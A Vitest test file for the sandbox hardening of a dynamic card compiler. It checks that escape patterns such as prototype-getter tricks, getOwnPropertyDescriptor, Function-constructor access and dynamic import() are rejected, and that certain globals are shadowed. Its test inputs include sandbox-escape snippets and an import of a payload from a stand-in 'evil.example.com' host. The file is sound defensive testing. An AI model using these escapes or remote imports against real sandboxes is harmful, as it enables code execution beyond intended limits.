/**
 * @vitest-environment node
 *
 * Tests for sandbox hardening features introduced in #19866:
 * - New FORBIDDEN_SANDBOX_PATTERNS: __lookupGetter__, __defineGetter__,
 *   __defineSetter__, getOwnPropertyDescriptor, dynamic import()
 * - New BLOCKED_GLOBALS: queueMicrotask, structuredClone, MessageChannel, AbortController
 * - Prototype chain freezing in deepFreeze
 * - Async createCardComponent (blob URL ES module approach)
 */
import { describe, it, expect, vi } from 'vitest'
import { createCardComponent } from '../compiler'

// Mock sucrase (transform is not invoked for createCardComponent)
vi.mock('sucrase', () => ({
  transform: vi.fn((code: string) => ({ code })),
}))

// Mock getDynamicScope with a minimal sandbox scope
vi.mock('../scope', () => ({
  getDynamicScope: () => {
    const React = {
      createElement: vi.fn(),
      Fragment: Symbol('Fragment'),
    }
    const nestedObj = { inner: { deep: 'value' } }
    const cleanupFn = vi.fn()
    const scope: Record<string, unknown> = {
      React,
      useState: vi.fn(),
      useEffect: vi.fn(),
      useMemo: vi.fn(),
      useCallback: vi.fn(),
      useRef: vi.fn(),
      useReducer: vi.fn(),
      cn: vi.fn(),
      useCardData: vi.fn(),
      commonComparators: {},
      useCardFetch: vi.fn(),
      Skeleton: vi.fn(),
      Pagination: vi.fn(),
      Spinner: vi.fn(),
      SpinWrapper: vi.fn(),
      setTimeout: vi.fn(),
      clearTimeout: vi.fn(),
      setInterval: vi.fn(),
      clearInterval: vi.fn(),
      __timerCleanup: cleanupFn,
      nestedObj,
    }
    Object.defineProperty(scope, 'eval', {
      value: undefined,
      enumerable: false,
      configurable: true,
    })
    return scope
  },
}))

describe('createCardComponent — sandbox hardening (#19866)', () => {
  describe('new forbidden patterns', () => {
    it('blocks __lookupGetter__ prototype access', async () => {
      const code = `
        var g = ({}).__lookupGetter__('toString');
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/__lookupGetter__/)
    })

    it('blocks __defineGetter__ prototype manipulation', async () => {
      const code = `
        ({}).__defineGetter__('x', function() { return 1; });
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/__defineGetter__/)
    })

    it('blocks __defineSetter__ prototype manipulation', async () => {
      const code = `
        ({}).__defineSetter__('x', function(v) {});
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/__defineSetter__/)
    })

    it('blocks getOwnPropertyDescriptor for descriptor-based escapes', async () => {
      const code = `
        var desc = Object.getOwnPropertyDescriptor(Function.prototype, 'constructor');
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/getOwnPropertyDescriptor/)
    })

    it('blocks dynamic import() expressions', async () => {
      const code = `
        var mod = import('https://evil.example.com/payload.js');
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/dynamic import\(\)/)
    })

    it('blocks import with template literal syntax', async () => {
      const code = `
        var mod = import  ('data:text/javascript,export default 1');
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/dynamic import\(\)/)
    })
  })

  describe('new blocked globals', () => {
    it('shadows queueMicrotask from dynamic card code', async () => {
      const code = `
        if (typeof queueMicrotask !== 'undefined') {
          throw new Error('queueMicrotask escaped sandbox');
        }
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })

    it('shadows structuredClone from dynamic card code', async () => {
      const code = `
        if (typeof structuredClone !== 'undefined') {
          throw new Error('structuredClone escaped sandbox');
        }
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })

    it('shadows MessageChannel from dynamic card code', async () => {
      const code = `
        if (typeof MessageChannel !== 'undefined') {
          throw new Error('MessageChannel escaped sandbox');
        }
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })

    it('shadows AbortController from dynamic card code', async () => {
      const code = `
        if (typeof AbortController !== 'undefined') {
          throw new Error('AbortController escaped sandbox');
        }
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })
  })

  describe('async API (blob URL module approach)', () => {
    it('createCardComponent returns a Promise', () => {
      const code = `
        function Card() { return null; }
        module.exports.default = Card;
      `
      const result = createCardComponent(code)
      expect(result).toBeInstanceOf(Promise)
    })

    it('resolves with component on valid code', async () => {
      const code = `
        function Card() { return null; }
        module.exports.default = Card;
      `
      const result = await createCardComponent(code)
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })

    it('resolves with error when module exports non-function', async () => {
      const code = `
        module.exports.default = { notAFunction: true };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toContain('must export a default React component function')
    })

    it('resolves with runtime error on thrown exception', async () => {
      const code = `
        throw new Error('sandbox test error');
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toContain('Runtime error')
    })

    it('cleans up globalThis scope after execution', async () => {
      const code = `
        function Card() { return null; }
        module.exports.default = Card;
      `
      await createCardComponent(code)
      // Verify no __CARD_SCOPE_ keys remain on globalThis
      const scopeKeys = Object.keys(globalThis).filter(k => k.startsWith('__CARD_SCOPE_'))
      expect(scopeKeys).toHaveLength(0)
    })

    it('cleans up globalThis scope even on error', async () => {
      const code = `
        throw new Error('cleanup test');
      `
      await createCardComponent(code)
      const scopeKeys = Object.keys(globalThis).filter(k => k.startsWith('__CARD_SCOPE_'))
      expect(scopeKeys).toHaveLength(0)
    })
  })

  describe('prototype chain freezing', () => {
    it('freezes nested object prototypes to prevent pollution', async () => {
      // Attempt to modify a prototype property of an injected scope object
      const code = `
        try {
          Object.getPrototypeOf(nestedObj).polluted = true;
          module.exports.default = function() { return null; };
          module.exports.wasMutated = true;
        } catch(e) {
          module.exports.default = function() { return null; };
          module.exports.wasMutated = false;
        }
      `
      const result = await createCardComponent(code)
      // getOwnPropertyDescriptor is blocked — this will be rejected at static analysis
      // But if the pattern changes, the freeze is the defense-in-depth layer
      expect(result.component).toBeNull()
    })

    it('deep-freezes injected scope objects recursively', async () => {
      const code = `
        try {
          nestedObj.inner.deep = 'modified';
          module.exports.default = function() { return null; };
          module.exports.mutated = true;
        } catch(e) {
          // Strict mode: TypeError on frozen object mutation
          module.exports.default = function() { return null; };
          module.exports.mutated = false;
        }
      `
      const result = await createCardComponent(code)
      // Should succeed but mutation should throw in strict mode
      expect(result.error).toBeNull()
      expect(typeof result.component).toBe('function')
    })
  })

  describe('existing patterns still blocked (regression)', () => {
    it('still blocks .constructor access', async () => {
      const code = `
        var f = (function(){}).constructor('return 1')();
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/\.constructor/)
    })

    it('still blocks __proto__ access', async () => {
      const code = `
        var c = (1).__proto__.constructor;
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/__proto__/)
    })

    it('still blocks AsyncFunction references', async () => {
      const code = `
        var AF = AsyncFunction;
        module.exports.default = function() { return null; };
      `
      const result = await createCardComponent(code)
      expect(result.component).toBeNull()
      expect(result.error).toMatch(/AsyncFunction/)
    })
  })
})
